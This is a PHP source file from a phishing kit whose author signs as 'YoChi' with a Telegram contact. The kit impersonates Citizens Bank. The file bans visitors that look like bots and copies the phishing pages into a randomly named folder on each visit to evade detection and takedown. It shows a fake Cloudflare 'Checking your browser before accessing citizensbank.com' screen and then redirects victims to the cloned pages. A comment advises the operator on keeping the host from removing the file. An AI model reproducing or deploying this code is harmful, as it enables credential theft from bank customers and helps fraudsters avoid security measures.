<?php

session_start();
include "btm.php";
if (!isset($_SESSION['ssww'])){logbot('NO COOKIES');banbot();exit();};
	/*

This file may be marked as a virus and taken down on your WHM/CPanel/HOST because of its behaviour of creating mutiple folders to host new pages printed on each visit to futher enhance the antibot system.

To stop it from being taken down 
Go to the settings.php file and turn the variable $createfolderpersession to 0, for example
$createfolderpersession = 0;
That variable has a default value of 1, turn it to 0 and the removal issue will be sorted,

NOTE THOUGH: Page may not last long enough as you have turn off a key antibot feature by doing that, best solution, change your host

Yours Truly
Signed
YoChi

P.S   Contact on telegram : yo_chi

*/
	$random=rand(0,10000000);
	$md5=md5("$random");
	$base=base64_encode($md5);
	$dst=md5("$base");
	$dst2 = substr(md5($dst) , -9);
	$dst  = strtolower($dst2 );
	function recurse_copy($src,$dst) {
	$dir = opendir($src);
	@mkdir($dst);
	while(false !== ( $file = readdir($dir)) ) {
	if (( $file != '.' ) && ( $file != '..' )) {
	if ( is_dir($src . '/' . $file) ) {
	recurse_copy($src . '/' . $file,$dst . '/' . $file);
	}
	else {
	copy($src . '/' . $file,$dst . '/' . $file);
	}
	}
	}
	closedir($dir);
	};
include "settings.php";
$src="content";
if($createfolderpersession==1){recurse_copy( $src, $dst );} 
else{
	$ds=md5(base64_encode(md5($src.$_SERVER['HTTP_HOST'])));
	$dst = strtolower(substr(md5($ds) , -9));
	if(!is_dir($dst)){recurse_copy( $src, $dst );};
	};
include $src."/autob/nav_detect.php";
$_SESSION['device']=@descuserattributes();
if($mobileonly==1 && !in_array($ua['platform'],array('iPhone','iPod','iPad','Android','BlackBerry','Mobile'))){logbot('BROWSER NOT MOBILE');banbot();};

if($cloudflarelanding!=1){
echo('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html style="background-color:#fff;">
	<head>
		<script>
	  document.cookie = "'.$_SESSION['ssww'].'="+window.screen.width;
	  document.cookie = "'.$_SESSION['sshh'].'="+window.screen.height;
</script>
<script>setTimeout(function(){window.location.href="'.$dst.'/";});</script>
	</head>
</html>');}
else{
echo('<!DOCTYPE html>
<html lang="en-US"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="robots" content="noindex, nofollow">
  <meta name="viewport" content="width=device-width,initial-scale=1">
<script>
	  document.cookie = "'.$_SESSION['ssww'].'="+window.screen.width;
	  document.cookie = "'.$_SESSION['sshh'].'="+window.screen.height;
</script>
<script>setTimeout(function(){window.location.href="'.$dst.'/";}, 4000);</script>
  <title>Just a moment...</title>
  <style type="text/css">
    html, body {width: 100%; height: 100%; margin: 0; padding: 0;}
    body {background-color: #ffffff; color: #000000; font-family:-apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue",Arial, sans-serif; font-size: 16px; line-height: 1.7em;-webkit-font-smoothing: antialiased;}
    h1 { text-align: center; font-weight:700; margin: 16px 0; font-size: 32px; color:#000000; line-height: 1.25;}
    p {font-size: 20px; font-weight: 400; margin: 8px 0;}
    p, .attribution, {text-align: center;}
    #spinner {margin: 0 auto 30px auto; display: block;}
    .attribution {margin-top: 32px;}
    @keyframes fader     { 0% {opacity: 0.2;} 50% {opacity: 1.0;} 100% {opacity: 0.2;} }
    @-webkit-keyframes fader { 0% {opacity: 0.2;} 50% {opacity: 1.0;} 100% {opacity: 0.2;} }
    #cf-bubbles > .bubbles { animation: fader 1.6s infinite;}
    #cf-bubbles > .bubbles:nth-child(2) { animation-delay: .2s;}
    #cf-bubbles > .bubbles:nth-child(3) { animation-delay: .4s;}
    .bubbles { background-color: #f58220; width:20px; height: 20px; margin:2px; border-radius:100%; display:inline-block; }
    a { color: #2c7cb0; text-decoration: none; -moz-transition: color 0.15s ease; -o-transition: color 0.15s ease; -webkit-transition: color 0.15s ease; transition: color 0.15s ease; }
    a:hover{color: #f4a15d}
    .attribution{font-size: 16px; line-height: 1.5;}
    .ray_id{display: block; margin-top: 8px;}
    #cf-wrapper #challenge-form { padding-top:25px; padding-bottom:25px; }
    #cf-hcaptcha-container { text-align:center;}
    #cf-hcaptcha-container iframe { display: inline-block;}
  </style>

</head>
<body>
  <table width="100%" height="100%" cellpadding="20">
    <tbody><tr>
      <td align="center" valign="middle">
          <div class="cf-browser-verification cf-im-under-attack">
  <noscript>
    <h1 data-translate="turn_on_js" style="color:#bd2426;">Please turn JavaScript on and reload the page.</h1>
  </noscript>
  <div id="cf-content" style="display: block;">
    
    <div id="cf-bubbles">
      <div class="bubbles"></div>
      <div class="bubbles"></div>
      <div class="bubbles"></div>
    </div>
    <h1><span data-translate="checking_browser">Checking your browser before accessing</span> citizensbank.com.</h1>
    <p data-translate="process_is_automatic">This process is automatic. Your browser will redirect to your requested content shortly.</p>
    <p data-translate="allow_5_secs" id="cf-spinner-allow-5-secs">Please allow up to 5 seconds…</p>
    <p data-translate="redirecting" id="cf-spinner-redirecting" style="display:none">Redirecting…</p>
  </div>
   
  <form id="challenge-form" action="" method="POST">
    <input type="hidden" id="jschl-answer" name="jschl_answer">
  </form>
     
</div>

          
          <div class="attribution">
            DDoS protection by <a rel="noopener noreferrer" >Cloudflare</a>
            <br>
            <span class="ray_id">Ray ID: <code>68ae510fh9dbc1ca</code></span>
          </div>
      </td>
     
    </tr>
  </tbody></table>
</body></html>');};
?>